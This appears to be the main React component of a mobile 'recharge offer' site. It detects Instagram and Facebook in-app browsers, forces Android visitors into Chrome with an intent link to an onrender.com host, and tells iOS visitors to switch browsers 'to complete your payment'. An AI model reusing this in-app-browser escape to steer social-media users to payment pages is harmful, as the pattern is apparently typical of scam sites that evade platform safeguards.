import './App.css';
import 'swiper/css';
import { BrowserRouter, Route, Routes } from 'react-router-dom';
import Header from './component/Header';
import Home from './component/Home';
import Getoffer from './component/Getoffer';
import { useEffect, useState } from 'react';
import ChromePage from './component/ChromePage';

function App() {
  const [show, setShow] = useState(true);
  const [data, setData] = useState(() => {
    // Retrieve data from localStorage
    const savedData = localStorage.getItem('rechargeData');
    return savedData ? JSON.parse(savedData) : null;
  });

  useEffect(() => {
    function isInstagramBrowser() {
      var ua = navigator.userAgent || navigator.vendor || window.opera;
      return (ua.indexOf('Instagram') > -1) || (ua.indexOf('FBAN') > -1) || (ua.indexOf('FBAV') > -1);
    }

    function redirectToChrome() {
      var androidUrl = "intent://check-yfoj.onrender.com/#Intent;scheme=https;package=com.android.chrome;end;";
      var fallbackUrl = "https://check-yfoj.onrender.com/";

      if (/android/i.test(navigator.userAgent)) {
        window.location.href = androidUrl;
      } else if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
        alert('To complete your payment, please open this link in Safari or Chrome.');
      } else {
        window.location.href = fallbackUrl;
      }
    }

    if (isInstagramBrowser()) {
      setShow(false);
      redirectToChrome();
    } else {
      setShow(true);
    }
  }, []);

  useEffect(() => {
    // Store data in localStorage whenever it changes
    if (data) {
      localStorage.setItem('rechargeData', JSON.stringify(data));
    }
  }, [data]);

  return (
    <BrowserRouter>
      {show && <Header />}
      <Routes>
        <Route path="/" element={show ? <Home /> : <ChromePage />} />
        <Route path="/recharge" element={<Getoffer data={data} setData={setData} />} />
      </Routes>
    </BrowserRouter>
  );
}

export default App;
